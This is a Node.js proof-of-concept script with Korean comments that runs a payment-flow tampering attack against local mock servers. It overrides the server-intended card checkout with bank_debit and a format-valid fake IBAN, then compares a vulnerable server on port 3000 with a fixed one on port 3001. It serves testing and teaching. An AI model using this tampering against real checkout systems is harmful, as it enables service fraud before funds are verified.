// attack-client.js
// 로컬 목업 서버를 상대로 "클라이언트가 결제 통로를 덮어쓰는" 공격을 재현한다.
// 실제 결제망/실서비스를 대상으로 하지 않는다. 대상은 localhost 목업뿐이다.
//
// 시나리오:
//   1) checkout_capabilities 조회 → 서버는 card를 의도
//   2) 하지만 클라이언트는 checkout_flow=bank_debit 로 바꿔서 제출
//   3) 형식만 유효한 (실존하지 않는) 로컬 계좌 문자열 사용
//
// 취약 서버(3000): 개통됨.  수정 서버(3001): 거부/보류됨.

const http = require("http");

const portArgIdx = process.argv.indexOf("--port");
const PORT = portArgIdx !== -1 ? Number(process.argv[portArgIdx + 1]) : 3000;

// 형식만 유효한 예시 문자열(문서용 예시값). 실존 계좌가 아니며, 실결제망에 쓰지 않는다.
const FORMAT_VALID_BUT_FAKE = "DE89370400440532013000";

function request(method, path, body) {
  return new Promise((resolve, reject) => {
    const data = body ? JSON.stringify(body) : null;
    const req = http.request(
      { host: "localhost", port: PORT, path, method,
        headers: data ? { "content-type": "application/json", "content-length": Buffer.byteLength(data) } : {} },
      (res) => {
        let out = "";
        res.on("data", (c) => (out += c));
        res.on("end", () => resolve({ status: res.statusCode, body: safeParse(out) }));
      }
    );
    req.on("error", reject);
    if (data) req.write(data);
    req.end();
  });
}
function safeParse(s) { try { return JSON.parse(s); } catch { return s; } }

(async () => {
  console.log(`\n=== 대상: http://localhost:${PORT} ===`);

  const cap = await request("GET", "/api/org/checkout_capabilities");
  console.log("1) 서버가 의도한 통로:", cap.body.checkout_flow);

  // 공격: 서버 의도를 무시하고 bank_debit + 가짜(형식만 유효) 계좌 제출
  const payload = {
    checkout_flow: "bank_debit",              // ← 덮어쓰기
    account: FORMAT_VALID_BUT_FAKE,           // ← 형식만 유효
    session_id: cap.body.session_id,          // (수정 서버만 사용)
  };
  console.log("2) 공격 제출: checkout_flow=bank_debit (서버 의도와 다름)");

  const r = await request("POST", "/api/org/checkout_submit", payload);
  console.log("3) 응답:", r.status, JSON.stringify(r.body));

  const opened = r.body && r.body.status === "subscription_active";
  console.log(
    opened
      ? "\n>>> 결과: 개통됨 ❌ (취약) — 자금 확인 전에 서비스가 열림"
      : "\n>>> 결과: 개통 안 됨 ✅ (안전) — 통로 재검증/지연개통이 막음"
  );
})().catch((e) => { console.error("요청 실패:", e.message, "\n서버가 켜져 있는지 확인."); process.exit(1); });
